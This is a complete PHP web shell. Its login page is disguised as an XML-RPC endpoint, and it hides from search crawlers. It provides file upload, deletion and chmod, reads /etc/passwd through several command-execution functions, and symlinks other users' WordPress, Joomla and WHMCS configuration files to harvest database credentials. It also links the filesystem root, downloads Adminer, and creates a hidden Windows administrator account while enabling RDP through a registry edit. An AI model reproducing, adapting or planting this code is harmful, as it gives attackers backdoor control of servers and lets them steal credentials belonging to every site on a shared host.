<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
$su = "300bf52dd231262bc2b99237e727246d"; // 
function Login() {
?>
<?php
if(isset($_GET['sayang']))
{
echo '<body bgcolor="black">
<center>
<br><br><br><br><br><br><br>
<form method="post"><!-- md5(9fef1a4e9ce2e605015d59eae25505ca) -->
<input type="password" name="pass"><input type="submit" value="Login" style="background:red"></button>
 </form>
 </center>
 
 ';
}else{
echo '
		
		  XML-RPC server accepts POST requests only.
		
		 ';
}
?>
<?php
exit;
}
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
    if( empty($su) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $su) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
 ?>
<?php
echo "berhasil login";
if (isset($_GET["logout"])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if(isset($_GET['mini'])){
echo '<!DOCTYPE HTML>
<html>
<head>
<center>
<style>
body{
font-family: "Tahoma";
background-color: black;
color:green;
}
#content tr:hover{
background-color: #191919;
text-shadow:0px 0px 10px #fff;
}

#content .first{
background-color: #191919;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<br>
<br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="lime">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?mini&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?mini&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Berhasil</font><br />';
}else{
echo '<font color="white">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lime">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br />';
}
	}
echo '';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus</font><br/>';
}else{
echo '<font color="white">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?mini&path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>null</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="white">';
//echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?mini&filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
//echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
}
echo '</table>
</div>';
}
echo '</body>
</html>';
function perms($file){
$perms = fileperms($file);
return $info;
}
}


if(isset($_GET['bypass'])){
echo '<div claas="container">
		 	<style>
		 	body{
		 	font-family: "Tahoma";
		 	background-color: black;
		 	color:green;
		 	}
		 	</style>
      <form method="POST">
          <p class="text-center">Bypass etc/passwd With :</p>
          <div class="d-flex justify-content-center flex-wrap">
              <input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
              <input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
              <input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
              <input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
              <input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
          </div><hr/>
          <p class="text-center">Bypass User With :</p>
          <div class="d-flex justify-content-center flex-wrap">
              <input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
              <input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
              <input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser"> 
              <input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">     
              <input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
          </div>
      </form>';
      $mail = 'ls /var/mail';
      $paswd = '/etc/passwd';
      if($_POST['syst']){
          echo"<textarea cols=50 rows='13'>";
          echo system("cat $paswd");
          echo"</textarea><br/>";
      }
      if($_POST['passth']){
          echo"<textarea cols=50 rows='13'>";
          echo passthru("cat $paswd");
          echo"</textarea><br/>";
      }
      if($_POST['ex']){
          echo"<textarea cols=50 rows='13'>";
          echo exec("cat $paswd");
          echo"</textarea><br/>";
      }
      if($_POST['shex']){
          echo"<textarea cols=50 rows='13'>";
          echo shell_exec("cat $paswd");
          echo"</textarea><br/>";
      }
      if($_POST['melex']){
          echo"<textarea cols=50 rows='13'>";
          for($uid=0;$uid<6000;$uid++){ 
              $ara = posix_getpwuid($uid);
              if (!empty($ara)){
                  while (list ($key, $val) = each($ara)){
                      print "$val:";
                  }
                  print "n";
              }
          }
          echo"</textarea><br/>";
      }
      
      if ($_POST['awkuser']){
          echo"<textarea class='form-control' rows='13'>
              ".shell_exec("awk -F: '{ print $1 }' $paswd | sort")."
          </textarea><br/>";
      }
      if ($_POST['systuser']){
          echo"<textarea class='form-control' rows='13'>";
          echo system("$mail");
          echo "</textarea><br>";
      }
      if ($_POST['passthuser']){
          echo"<textarea class='form-control' rows='13'>";
          echo passthru("$mail");
          echo "</textarea><br>";
      }
      if ($_POST['exuser']){
          echo"<textarea class='form-control' rows='13'>";
          echo exec("$mail");
          echo "</textarea><br>";
      }
      if ($_POST['shexuser']){
          echo"<textarea class='form-control' rows='13'>";
          echo shell_exec("$mail");
          echo "</textarea><br>";
      }
  echo "</div>";
  exit;
}

if(isset($_GET['adminer'])){
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi){
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')){
        echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
    }else{
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")){
            echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
        }else{
            echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
        }
    }
    exit;
}


if(isset($_GET["grab"])){
echo "
<body bgcolor=black>
<form method='POST'>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
echo "<br><center>";
if (empty($_POST['config'])) { echo "<p><font face=Tahoma color=#007700 size=2pt>/etc/passwd content</p><br><form method=POST><textarea name=passwd class=area rows=15 cols=60>";
	echo file_get_contents('/etc/passwd'); 
	echo "</textarea><br><br><input name=config class=inputzbut size=100 value=Grab! type=submit><br></form></center><br>";
 }
 
if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('ustadtamvan_grabber', 0755);@chdir('ustadtamvan_grabber');
	$htaccess="
		OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
		Options Indexes FollowSymLinks
		ForceType text/plain
		AddType text/plain .php 
		AddType text/plain .html
		AddType text/html .shtml
		AddType txt .php
		AddHandler server-parsed .php
		AddHandler txt .php
		AddHandler txt .html
		AddHandler txt .shtml
		Options All
		Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>grabbing, please wait ...</center><br>";
	foreach($passwd as $pwd){
		$pawd=explode(":",$pwd);$user =$pawd[0];
			@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
			@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
			@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
			@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
			@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
			@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
			@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
			@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
			@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
			@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
			@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
			@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
			@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
			@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
			@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
			@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
			@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
			@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
			@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
			@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
			@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
			@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
			@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
			@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
			@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
			@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
			@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
			@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
			@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
			@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
			@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
			@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
			@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
			@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
			@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
			@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
			@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
			@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
			@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
			@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
		echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="ustadtamvan_grabber">Open configs</a></font></b>';
	}
}
 
 
if(isset($_GET["jump"]))
    {
     ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
    set_time_limit(0);
    ###################
    @$passwd = fopen('/etc/passwd','r');
    if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
    $pub = array();
    $users = array();
    $conf = array();
    $i = 0;
    while(!feof($passwd))
    {
        $str = fgets($passwd);
        if ($i > 999)
            {
            $pos = strpos($str,':');
            $username = substr($str,0,$pos);
            $dirz = '/home/'.$username.'/public_html/';
            if (($username != ''))
                {
                if (is_readable($dirz))
                    {
                    array_push($users,$username);
                    array_push($pub,$dirz);
                    }
                }
            }
        $i++;
    }
    
    ###################
    echo '<br>';
    echo "[+] Founded <font size=15 color=red> ".sizeof($users)." </font> entrys in /etc/passwd\n"."<br />";
    echo "[+] Founded <font color=red size=15> ".sizeof($pub)." </font> readable public_html directories\n"."<br />";
    echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
    foreach ($users as $user)
        {
        $path = "/home/$user/public_html/";
        echo "<table bgcolor=black class=style2 ><td>";
        echo "<font color=white>[Ok] $path</font><br>";
        echo "</td></table>";
        }
    echo "\n";
}

if(isset($_GET['vhost'])) {
	if($_POST['gas']){
		@mkdir("vhost_c7e", 0777);
		@chdir("vhost_c7e");
		system("ln -s / root");
			$htaccess="
				Options Indexes FollowSymLinks
				DirectoryIndex ngeue.htm
				AddType text/plain .php
				AddHandler text/plain .php
				Satisfy Any";
		@file_put_contents(".htaccess",$htaccess);
		$etcp=$_POST['passwd'];
		    
		$etcp=explode("\n",$etcp);
	foreach($etcp as $passwd){
		$pawd=explode(":",$passwd);
		$user =$pawd[5];
		$vh = preg_replace('/\/var\/www\/vhosts\//', '', $user);
		if (preg_match('/vhosts/i',$user)){
			system("ln -s ".$user."/httpdocs/wp-config.php ".$vh."-Wordpress.txt");
			system("ln -s ".$user."/httpdocs/configuration.php ".$vh."-Joomla.txt");
			system("ln -s ".$user."/httpdocs/config/koneksi.php ".$vh."-Lokomedia.txt");
			system("ln -s ".$user."/httpdocs/forum/config.php ".$vh."-phpBB.txt");
			system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$vh."-Drupal.txt");
			system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$vh."-PrestaShop.txt");
			system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$vh."-Magento.txt");
			system("ln -s ".$user."/httpdocs/admin/config.php ".$vh."-OpenCart.txt");
			system("ln -s ".$user."/httpdocs/application/config/database.php ".$vh."-Ellislab.txt");
			system("ln -s ".$user."/httpdocs/inc/connect.php ".$vh."-Parallels.txt");
			system("ln -s ".$user."/httpdocs/inc/config.php ".$vh."-MyBB.txt");
		 
			}
		}
		echo "<center><a href='vhost_c7e/root/'><u>Symlinknya</u></a><br><a href='vhost_c7e/'><u>Config</u></a>";
	}else{
		echo "<center><form method='POST' action=''>
		<textarea name='passwd' rows='15' cols='60'>";
		echo include("/etc/passwd");
		echo "</textarea>";
		echo "<br><br>";
		echo "<input type='submit' name='gas' value='exsekusi'></center></form>";
	}
}

if(isset($_GET['rdp'])){
error_reporting(0);
$br = "<br>";
$warna_putih = '<font color="white">';
$server_os = '<font color="whitegreen">'.@PHP_OS.$br."</font>"; 
$server_uname = '<font color="redwhite">'.@php_uname().$br."</font>"; 
$server_php = '<font color="bluewhite">'.@phpversion()."<a href='?act=phpinfo' target=_Blank>[Full]</a></font>".$br; 
if(@ini_get('safe_mode')){ 
	$save_mod ='<font color="greenyellow">'. "ON"."</font>"; 
}else{ 
	$save_mod = '<font color="red">'."OFF"."</font>"; 
}
if(preg_match("/Windows|Windows NT|NT/i", $server_os)){ 
	$status ='<font color="greenyellow">'. "It's Work"."</font>"; 
}else { 
	$status = '<font color="red">'."It's Not Work"."</font>"; 
}
?>
<!DOCTYPE html>
<html>
<head>
	<style type="text/css">
	* {
	padding: 0px;
	#font-family: "Lucida Sans", Verdana, Sans-Serif;
	font-family: monospace;
}

a {
	text-decoration: none;
	color: #00cc66;
}

a:hover {
	clear: both;
#	text-decoration: underline;
	color: #00cc66;
}

.new {
	font-weight: normal;
	color: red;
	text-shadow: 0px 3px 6px #00cc66;
}

.comment {
	font-weight: normal;
	color: gray;
}



.code { background:#00cc66; background-repeat:no-repeat; border: solid #00cc66; border-radius: 5px; color: #000000; font: 13px 'Courier New', Courier, monospace; line-height: 16px; margin: 10px 0 10px 10px; overflow: auto; padding: 28px 10px 10px; width: 90%; } .code:hover { background-repeat:no-repeat; }





.special {
	font-size: 1.4em;
	font-weight: bold;
	color: white;
}

article {
	font-size: 12px;
}

body {
	background-color: #000;
	color: #a9cd9f;
	font-family: "verdana";
	font-size: 1em;
	
}


body2 {
	background-color: #000;
	color: #a9cd9f;
	font-family: "verdana";
	font-size: 12px;
	
}

#box {
	border: 1px dotted #000;
	margin: auto;
	padding: 0px 10px 10px 10px;
}

#container {
	margin: auto;
}

.news {
	width: 30%;
	float: left;
	text-align: justify;
	margin: 10px;
	padding: 1px;
}

.date {
	color: gray;
	font-size: 10px;
	margin: 0px;
}

h3 { margin: 30px 0px 0px 0px; }

header {	color: #00cc66; }

#logo {
	text-align: left;
	width: 79%;
	color: #00cc66;
	margin: auto;
	text-shadow: gray 2px 3px 10px;
	font-size: 16px;
	font-family: monospace;
}

#frase {
	font-size: 12px;
	margin: 0px 0px 6px 0px;
	text-align: center;
}

#menu {
	margin-top: 10px;
	font-size: 14px;
	text-align: center;
}

#menu a { color: gray; }
#menu a:hover { color: #00cc66; }

ul {
	margin-left: 15px;
	list-style-type: circle;
}

li {
	margin-top: 6px;
}

#foot {
	text-transform: uppercase;
	height: 6px;
	font-size: 6px;
	text-align: center;
	padding-top: 4px;
}




button.css3button  {
	-moz-box-shadow:inset 0px 1px 0px 0px #ffffff;
	-webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;
	box-shadow:inset 0px 1px 0px 0px #ffffff;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #ffffff), color-stop(1, #f6f6f6));
	background:-moz-linear-gradient(top, #ffffff 5%, #f6f6f6 100%);
	background:-webkit-linear-gradient(top, #ffffff 5%, #f6f6f6 100%);
	background:-o-linear-gradient(top, #ffffff 5%, #f6f6f6 100%);
	background:-ms-linear-gradient(top, #ffffff 5%, #f6f6f6 100%);
	background:linear-gradient(to bottom, #ffffff 5%, #f6f6f6 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#f6f6f6',GradientType=0);
	background-color:#ffffff;
	-moz-border-radius:6px;
	-webkit-border-radius:6px;
	border-radius:6px;
	border:1px solid #dcdcdc;
	display:inline-block;
	cursor:pointer;
	color:#666666;
	font-family:arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #ffffff;
}

.clear { clear: both; }



#galeria {
	width:510px;
	margin:0 auto;
}
#galeria player {
height480px
}
#galeria ul, #galeria ul li {
	float:left;
	margin:0;
	padding:0;
}
#galeria ul li {
	list-style:none;
	margin:0 10px 10px 0;
}
#galeria ul li:nth-child(4n) {
	margin-right:0
}



.voltarTopo {
    background: none repeat scroll 0 0 #000000 !important;
    bottom: 20px !important;
    color: #FFFFFF;
    display: block;
    font-size: 10px;
    font-weight: bold;
    height: 20px;
    line-height: 100px;
    position: fixed;
    right: 30px;
    text-transform: uppercase;
    width: 120px;
}
</style>
<link href="netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet">

</head>
<body>
<pre><div id="logo">
<form action="" method="post">


     _    _
    (o)--(o) 
   /.______.\  <?php echo "OS   : ".php_uname()."<br>";?>
   \________/  <?php echo "IP : ".gethostbyname($_SERVER["HTTP_HOST"])." / Hostname : ".shell_exec(hostname);?>
  ./        \. <?php echo "Status : ".$status."<br>";?>
 ( 
  \ \_\\//_/ / 
   ~~  ~~  ~~

   </form>
   </div>
   </pre> 

   <div id="box">
<div id="logo">
<FORM action="" method="post">
<p>{SET USERNAME & PASSWORD RDP}</p>
<br>
	Username : <input type="text" name="uname" > Password <input type="text" name="upass" > - <input type="submit" name="rdp" value="submit">
</FORM>
<FORM action="">
<p>Fix RDP Connection refused : <input type="submit" name="fixrdp" value="Start Fix"></p>
</FORM>

              <?php

if($_POST['rdp']){
	echo "---------------------------------------------------------------<br>";
$rdp_user = $_POST['uname'];
$rdp_upas = $_POST['upass'];
if (!empty($rdp_user) AND !empty($rdp_upas)){
	$cmd_cek_user   = shell_exec("net user"); 
	if(preg_match("/$rdp_user/", $cmd_cek_user)){
		echo "username ".$rdp_user." sudah ada"."<br>";
	}else {
     $cmd_add_user   = shell_exec("net user ".$rdp_user." ".$rdp_upas." /add");
     $cmd_add_groups = shell_exec("net localgroup Administrators ".$rdp_user." /add");
     
    	if($cmd_add_user==""){
     	echo shell_exec(hostname)." (add user) > ".$rdp_user."<font color='red'> not success</font>"."<br>";
     }else {
     	echo shell_exec(hostname)." (add user) > ".$rdp_user."<font color='greenyellow'> success</font>"."<br>";
     	echo shell_exec(hostname)." (add pass) > ".$rdp_user."<font color='greenyellow'> success</font>"."<br>";
     }

         	if($cmd_add_groups==""){
     	echo shell_exec(hostname)." (add groups Administrators) > ".$rdp_user."<font color='red'> not success</font>"."<br>";
     }else {
     	echo shell_exec(hostname)." (add groups Administrators) > ".$rdp_user."<font color='greenyellow'> success</font>"."<br>";
     }
       echo shell_exec(hostname)." > RDP IP : ".gethostbyname($_SERVER["HTTP_HOST"])." - Username ".$rdp_user." | Password ".$rdp_upas."<br>";
	}

}


              if($_POST['logout']){
session_destroy();
echo '<script type="text/javascript">
			alert("Logout Successful");
			document.location="?p=password";
		</script>';
}
 if($_POST['fixrdp']){
$hostnams = shell_exec(hostname);
$command  = '@reg add "\\'.$hostnams.'\HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'; 
$cmd_exc = shell_exec($command);
echo $cmd_exc."<br>";
echo "Fix Done!!!";
 }

          }
}

?> 